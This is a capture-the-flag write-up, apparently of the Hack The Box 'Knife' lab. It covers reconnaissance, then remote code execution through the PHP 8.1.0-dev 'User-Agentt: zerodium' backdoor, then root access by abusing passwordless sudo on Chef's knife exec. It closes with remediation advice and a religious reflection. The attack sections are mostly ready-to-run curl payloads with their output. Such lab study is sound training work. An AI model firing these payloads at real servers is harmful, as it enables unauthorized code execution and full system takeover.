# Knife

Uncovering the infamous PHP 8.1.0-dev backdoor and executing the User-Agent RCE! 🔓🚀

***

### 🔪 Knife: The Supply Chain Deception

![](https://cdn-images-1.medium.com/max/800/1*H9Y1M7lGla0NnUU11VuF6A.png)

Image created by Nicholas Mullenski (Gemini)

**Target:** _Knife (10.10.10.242)_ **OS:** _Linux_ _(Ubuntu)_ **Difficulty:** _Easy_ **Attack Vectors:** _PHP Supply Chain Backdoor -> Remote Code Execution (RCE) -> Sudo Misconfiguration (GTFOBins)_.

> [**Not a Member?? Click Here to read Full-Story**](https://medium.com/the-first-digit/knife-the-invisible-wound-in-the-supply-chain-5a2df1d3683d?sk=333142e9bc23b8af0f830b876253fd80)

### Executive Summary

**Assessment Date:** _January 1, 2026_ **Risk Level:** _CRITICAL_ **Author:** _Nicholas Mullenski_

### Overview

The “Knife” engagement demonstrated a severe supply chain compromise affecting the underlying web infrastructure. The target server was hosting a web application powered by a development version of PHP (**PHP 8.1.0-dev**) that contained a malicious backdoor. This backdoor allowed unauthenticated attackers to execute arbitrary code by manipulating HTTP headers.

### Key Findings

1. **Supply Chain Compromise:** The web server identified itself as running “PHP 8.1.0-dev”. This specific version was compromised at the source code level in March 2021, containing a hidden backdoor.
2. **Remote Command Execution (RCE):** By sending a specially crafted **`User-Agentt`** header (noting the double 't'), an attacker could bypass authentication and execute system commands as the **`www-data`** user.
3. **Privilege Escalation:** The system utility **`knife`** (part of the Chef infrastructure management tool) was configured to run via **`sudo`** without a password. This allowed for immediate escalation to Root privileges.

### Strategic Recommendation

Organizations must strictly avoid deploying “dev” or “nightly” build versions of software in production environments. All software versions should be verified against official release signatures. The specific compromised version of PHP must be replaced with a stable, patched release immediately.

### 1.0 Initial Foothold

#### 1.1 Reconnaissance & Enumeration

#### 1.1.1 Nmap Scan

* We began the engagement with a comprehensive port scan to identify the attack surface.

**Command:**

```
nmap -sC -sV -A -p- -vvv 10.10.10.242 -Pn --min-rate=5000
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Apache httpd 2.4.41
```

#### 1.1.2 Analysis

* The scan revealed a minimal attack surface with only SSH and HTTP exposed. The Apache version (2.4.41) is relatively standard. The critical next step is to fingerprint the backend scripting language to identify potential vulnerabilities in the web stack.

#### 1.2 Web Enumeration (Fingerprinting)

#### 1.2.1 Banner Grabbing

* To identify the technology stack powering the web server, I inspected the HTTP response headers.

**Command:**

```
curl -I http://10.10.10.242
HTTP/1.1 200 OK
Date: Thu, 01 Jan 2026 23:45:10 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Content-Type: text/html; charset=UTF-8
```

**Findings:** The server header revealed a highly specific and vulnerable version of PHP.

### 2.0 Vulnerability Analysis

#### 2.1 The “User-Agentt” Backdoor

* Research into **`PHP 8.1.0-dev`** revealed that the Git repository for PHP was compromised. Malicious code was injected that looks for an HTTP header named **`User-Agentt`** (note the double 't'). If the header string starts with **`zerodium`**, the system executes the PHP code following it.

**Vulnerable Code Snippet:**

```

┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Knife]
└─$ curl -s -H "User-Agentt: zerodium;system('cat /home/james/user.txt');exit;" http://10.10.10.242/
04fe94c8f12436c494b0e48240e8a5b8
No input file specified.
```

### 3.0 Privilege Escalation (Root)

#### 3.1 Sudo Enumeration

#### 3.1.1

* Having established Remote Code Execution (RCE) via the PHP backdoor, I utilized **`curl`** to inspect the **`sudo`** configuration for the compromised user.

**Command:**

```
┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Knife]
└─$ curl -s -H "User-Agentt: zerodium;system('sudo -l');exit;" http://10.10.10.242/
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
No input file specified.
```

**Findings:** The output confirmed a “GTFOBins” vector. The user `james` can run the **`knife`** utility as root without a password.

#### 4.2 Exploiting “Knife” (GTFOBins)

#### 4.2.1

**`Knife`** is a command-line tool for managing Chef infrastructure. It includes an **`exec`** command that allows the execution of Ruby scripts. Since we can run this as root, we can use a one-liner to read the root flag directly, bypassing the need for a fully interactive shell.

**Methodology:** I constructed a nested payload:

1. **PHP Layer:** The **`system()`** call executes the bash command.
2. **Bash Layer:** **`sudo knife exec -E`** runs the Ruby code.
3. **Ruby Layer:** **`exec("cat /root/root.txt")`** reads the flag.

**Final Exploit Command:**

```

┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Knife]
└─$ curl -s -H "User-Agentt: zerodium;system('sudo knife exec -E \"exec(\\\"cat /root/root.txt\\\")\"');exit;" http://10.10.10.242/
5aef56cd410263690ee5b26e82e57b3b
No input file specified.
```

![](https://cdn-images-1.medium.com/max/800/1*K-_o5OtkezA3XraTcz5AKQ.png)

Image created by Nicholas Mullenski

### Executive Conclusion

The **Knife** engagement serves as a stark reminder of the dangers of **Supply Chain Attacks**.

1. **The Flaw:** The organization was running a compromised “dev” version of PHP (**`8.1.0-dev`**). This version contained a hardcoded backdoor injected via a malicious commit to the official PHP git repository.
2. **The Impact:** This allowed unauthenticated attackers to execute code remotely by simply modifying a single HTTP header (**`User-Agentt`**), completely bypassing standard authentication mechanisms.
3. **The Escalation:** Poorly scoped **`sudo`** permissions on the **`knife`** utility allowed for immediate elevation to Root using a simple one-liner.

### Red Team Mandate

**Remediation Strategy:**

1. **Strict Version Control:** Never deploy “dev”, “nightly”, or “snapshot” versions of critical infrastructure software in a production environment. Stick to stable, signed releases. The use of **`PHP 8.1.0-dev`** was the primary failure point.
2. **Least Privilege Implementation:** Restrict **`sudo`** permissions. Administrative tools like **`knife`** (which allow script execution) should never be run as root without password authentication or tight argument restrictions.
3. **Network Segmentation:** While not the primary vector here, web servers running experimental software should be strictly isolated from the internal network to prevent lateral movement.

### The Biblical Tie-In

The vulnerability in this lab came from a **poisoned source**. The administrators likely thought they were downloading a standard, safe tool (PHP), but the source code itself had been compromised by a “wolf in sheep’s clothing.”

> _**“Watch out for false prophets. They come to you in sheep’s clothing, but inwardly they are ferocious wolves.” — Matthew 7:15 (NIV)**_

**Application:** In cybersecurity, we implicitly trust our repositories, our libraries, and our updates. In our spiritual lives, we often implicitly trust the media we consume, the advice we hear, or the “truths” culture hands us. But just because a source looks official doesn’t mean it’s pure. We must verify the source. We must “test the spirits” to see if they are from God, ensuring we aren’t installing a backdoor into our hearts that the enemy can use later.

### 🚀 Join the Mission

I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.

* Is there a specific tool you wish existed?
* Is there a hacking concept you want me to learn and explain?
* Do you have a “brick wall” you’re hitting in your own research?

Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.

[**Join the Iron-Breach Discord Server!**\
_&#x41;n advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…_&#x64;iscord.gg](https://discord.gg/y5P9NrzUBX)

By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [January 9, 2026](https://medium.com/p/5a2df1d3683d).

[Canonical link](https://medium.com/@nicholasmullenski/knife-the-invisible-wound-in-the-supply-chain-5a2df1d3683d)

Exported from [Medium](https://medium.com) on September 1, 2026.
